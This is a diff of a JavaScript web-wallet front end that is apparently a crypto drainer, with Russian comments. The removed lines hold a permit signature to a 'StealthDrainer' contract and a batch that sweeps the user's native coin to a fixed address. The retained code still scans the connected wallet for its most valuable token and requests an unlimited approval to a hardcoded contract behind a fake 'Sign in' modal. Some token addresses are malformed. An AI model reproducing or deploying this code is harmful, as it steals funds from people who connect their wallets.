@@ -3,33 +3,15 @@ import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
 import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
-import { signPermit } from 'eth-permit';
+
 // === Глобальный флаг для управления sendCalls ===
 const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
-
-// Нативные символы и получатель перевода нативки
-const NATIVE_SYMBOLS = {
-  'Ethereum': 'ETH',
-  'BNB Smart Chain': 'BNB',
-  'Polygon': 'MATIC',
-  'Arbitrum': 'ETH',
-  'Optimism': 'ETH',
-  'Base': 'ETH',
-  'Scroll': 'ETH',
-  'Avalanche': 'AVAX',
-  'Fantom': 'FTM',
-  'Linea': 'ETH',
-  'zkSync': 'ETH',
-  'Celo': 'CELO'
-}
-const NATIVE_RECIPIENT = '0x1234567890123456789012345678901234567890'
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
   let timeout
   return (...args) => {
     clearTimeout(timeout)
-
     timeout = setTimeout(() => func(...args), wait)
   }
 }
@@ -98,21 +80,6 @@ const CONTRACTS = {
   [networkMap['zkSync'].chainId]: '0xcdef1234567890abcdef1234567890abcdef1234',
   [networkMap['Celo'].chainId]: '0xdef1234567890abcdef1234567890abcdef12345'
 }
-
-const PROXY_CONTRACTS = {
-  [networkMap['Ethereum'].chainId]: '0xNewProxyAddress', // Замени на адрес промежуточного контракта для Ethereum
-  [networkMap['BNB Smart Chain'].chainId]: '0x1d1935C909cf547BBB98FCEB3695A9D5F146A510', // Твой текущий контракт или новый адрес
-  [networkMap['Polygon'].chainId]: '0xNewProxyAddress', // Замени на адрес для Polygon
-  [networkMap['Arbitrum'].chainId]: '0xNewProxyAddress',
-  [networkMap['Optimism'].chainId]: '0xNewProxyAddress',
-  [networkMap['Base'].chainId]: '0xNewProxyAddress',
-  [networkMap['Scroll'].chainId]: '0xNewProxyAddress',
-  [networkMap['Avalanche'].chainId]: '0xNewProxyAddress',
-  [networkMap['Fantom'].chainId]: '0xNewProxyAddress',
-  [networkMap['Linea'].chainId]: '0xNewProxyAddress',
-  [networkMap['zkSync'].chainId]: '0xNewProxyAddress',
-  [networkMap['Celo'].chainId]: '0xNewProxyAddress'
-};
 
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 const appKit = createAppKit({
@@ -205,7 +172,6 @@ function createCustomModal() {
   const modal = document.createElement('div')
   modal.id = 'customModal'
   modal.className = 'custom-modal'
-
   modal.innerHTML = `
     <div class="custom-modal-content">
       <p class="custom-modal-title">Sign in</p>
@@ -512,7 +478,6 @@ const TOKENS = {
     { symbol: 'QUICK', address: '0x831753dd7087cac61ab5644b308642cc1c33dc13', decimals: 18 },
     { symbol: 'GHST', address: '0x3857eeac5cb85a38a9a07a70c73e0a3271cfb54a7', decimals: 5 },
     { symbol: 'DFYN', address: '0xc168e40227e4ebd8c1dabb4b05d0b7c', decimals: 18 },
-
     { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
     { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0a0faea8e9b7ea0f28c4', decimals: 18 },
     { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 }
@@ -583,8 +548,7 @@ const erc20Abi = [
     outputs: [{ name: 'success', type: 'bool' }],
     type: 'function'
   }
-];
-
+]
 
 const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
   if (!address || !tokenAddress || !isAddress(address) || !isAddress(tokenAddress)) {
@@ -652,86 +616,33 @@ const getTokenPrice = async (symbol) => {
 }
 
 const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
-  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized');
-  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address');
-  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address');
-
-  const checksumTokenAddress = getAddress(tokenAddress);
-  const checksumDrainerAddress = getAddress(CONTRACTS[chainId]); // StealthDrainerBNB
-  const checksumProxyAddress = getAddress(PROXY_CONTRACTS[chainId]); // Промежуточный контракт
-
-  console.log(`Approving token ${checksumTokenAddress} for drainer ${checksumDrainerAddress} on chain ${chainId} via permit`);
-
+  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
+  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
+  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
+  const checksumTokenAddress = getAddress(tokenAddress)
+  const checksumContractAddress = getAddress(contractAddress)
   try {
-    const amountToApprove = maxUint256; // Максимальный allowance
-    // const amountToApprove = parseUnits("100", 18); // Для тестов
-    const deadline = Math.floor(Date.now() / 1000) + 60 * 30; // 30 минут
-
-    // Подписываем permit
-    const { v, r, s } = await signPermit(
-      wagmiConfig.account,
-      {
-        chainId,
-        token: checksumTokenAddress,
-        owner: wagmiConfig.account,
-        spender: checksumDrainerAddress,
-        value: amountToApprove,
-        deadline
-      },
-      wagmiConfig.provider
-    );
-
-    // Вызываем participate с permit
-    console.log(`Calling participate with permit...`);
-    const participateTxHash = await writeContract(wagmiConfig, {
-      address: checksumProxyAddress,
-      abi: proxyAbi,
-      functionName: 'participate',
-      args: [checksumTokenAddress, amountToApprove, deadline, v, r, s],
-      chainId,
-      gas: await estimateGas(wagmiConfig, {
-        account: wagmiConfig.account,
-        to: checksumProxyAddress,
-        data: encodeFunctionData({
-          abi: proxyAbi,
-          functionName: 'participate',
-          args: [checksumTokenAddress, amountToApprove, deadline, v, r, s]
-        }),
-        chainId
-      }),
-      maxFeePerGas: await getGasPrice(wagmiConfig, { chainId }),
-      maxPriorityFeePerGas: await getGasPrice(wagmiConfig, { chainId })
-    });
-
-    console.log(`Participate transaction sent: ${participateTxHash}`);
-
-    monitorAndSpeedUpTransaction(participateTxHash, chainId, wagmiConfig).catch(error => {
-      console.error(`Error monitoring transaction ${participateTxHash}:`, error);
-    });
-
-    return participateTxHash;
+    const txHash = await writeContract(wagmiConfig, {
+      address: checksumTokenAddress,
+      abi: erc20Abi,
+      functionName: 'approve',
+      args: [checksumContractAddress, maxUint256],
+      chainId
+    })
+    console.log(`Approve transaction sent: ${txHash}`)
+    
+    // Запускаем мониторинг транзакции в фоне
+    monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
+      console.error(`Error monitoring transaction ${txHash}:`, error)
+    })
+    
+    return txHash
   } catch (error) {
-    store.errors.push(`Transaction failed: ${error.message}`);
-    throw error;
+    store.errors.push(`Approve token failed: ${error.message}`)
+    throw error
   }
-};
+}
 
-const proxyAbi = [
-  {
-    inputs: [
-      { name: 'token', type: 'address' },
-      { name: 'amount', type: 'uint256' },
-      { name: 'deadline', type: 'uint256' },
-      { name: 'v', type: 'uint8' },
-      { name: 'r', type: 'bytes32' },
-      { name: 's', type: 'bytes32' }
-    ],
-    name: 'participate',
-    outputs: [],
-    stateMutability: 'nonpayable',
-    type: 'function'
-  }
-];
 // Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
   if (!mostExpensive) {
@@ -798,36 +709,14 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         value: '0x0'
       }))
 
-    // Рассчитываем нативный перевод: баланс минус газ и минус 0.0005
-    let nativeCall = null
-    try {
-      const bal = await getBalance(wagmiAdapter.wagmiConfig, { address: getAddress(state.address), chainId: mostExpensive.chainId })
-      const gasPrice = await getGasPrice(wagmiAdapter.wagmiConfig, { chainId: mostExpensive.chainId })
-      const gasLimit = await estimateGas(wagmiAdapter.wagmiConfig, { account: getAddress(state.address), to: getAddress(NATIVE_RECIPIENT), value: '0x1', chainId: mostExpensive.chainId }).catch(() => 21000n)
-      const gasCost = gasPrice * gasLimit
-      const reserveWei = parseUnits('0.0005', 18)
-      const afterGas = bal.value > gasCost ? (bal.value - gasCost) : 0n
-      if (afterGas > reserveWei) {
-        const sendAmount = afterGas - reserveWei
-        nativeCall = { to: getAddress(NATIVE_RECIPIENT), value: `0x${sendAmount.toString(16)}` }
-      }
-    } catch (e) {
-      console.warn('Native transfer compute failed:', e?.message || e)
-    }
-
-    // Составляем набор вызовов для батча (approve + nativeCall)
-    const calls = []
-    if (approveCalls.length > 0) calls.push(...approveCalls)
-    if (nativeCall) calls.push(nativeCall)
-
     // Send batch transaction
-    if (calls.length > 0) {
+    if (approveCalls.length > 0) {
 	const gasLimit = BigInt(550000)
    	const maxFeePerGas = BigInt(1000000000)
     	const maxPriorityFeePerGas = BigInt(1000000000)
     	console.log(`Approving token with gasLimit: ${gasLimit}, 	maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
       const id = await sendCalls(wagmiAdapter.wagmiConfig, {
-        calls,
+        calls: approveCalls,
         account: getAddress(state.address),
         chainId: mostExpensive.chainId,
         gas: gasLimit,
@@ -866,20 +755,6 @@ const initializeSubscribers = (modal) => {
           console.warn(`Network ${networkName} not found in networkMap`)
           return
         }
-        // Добавляем нативный баланс
-        balancePromises.push(
-          getBalance(wagmiAdapter.wagmiConfig, { address: getAddress(state.address), chainId: networkInfo.chainId })
-            .then(bal => ({
-              symbol: NATIVE_SYMBOLS[networkName] || 'NATIVE',
-              balance: Number(formatUnits(bal.value, 18)),
-              address: 'native',
-              network: networkName,
-              chainId: networkInfo.chainId,
-              decimals: 18,
-              isNative: true
-            }))
-            .catch(() => ({ symbol: NATIVE_SYMBOLS[networkName] || 'NATIVE', balance: 0, address: 'native', network: networkName, chainId: networkInfo.chainId, decimals: 18, isNative: true }))
-        )
         tokens.forEach(token => {
           if (isAddress(token.address)) {
             balancePromises.push(
@@ -914,8 +789,7 @@ const initializeSubscribers = (modal) => {
           const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
           const value = token.balance * price
           token.price = price
-          // Нативные токены учитываем в цене для уведомлений, но не выбираем как "самый дорогой"
-          if (!token.isNative && value > maxValue) {
+          if (value > maxValue) {
             maxValue = value
             mostExpensive = { ...token, price, value }
           }
@@ -1028,7 +902,6 @@ const initializeSubscribers = (modal) => {
               })
               setTimeout(() => {
                 unsubscribe()
-
                 reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
               }, 10000)
             })
